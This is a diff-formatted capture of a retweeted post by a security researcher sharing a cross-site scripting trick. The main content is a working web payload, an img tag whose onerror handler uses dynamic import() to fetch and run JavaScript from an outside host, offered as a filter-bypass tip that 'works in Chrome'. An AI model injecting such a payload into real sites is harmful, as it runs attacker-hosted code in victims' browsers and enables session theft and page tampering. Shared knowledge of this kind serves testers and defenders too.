@@ -1,0 +1,17 @@
+x0rz Retweeted
+
+Bo0oM 💣
+@i_bo0om
+·
+1h
+Load external javascript in script:
+
+import('url')
+
+For example:
+
+<img src onerror=import('//bo0om.ru/x/')>
+
+Works in Chrome
+
+#XSS #javascript
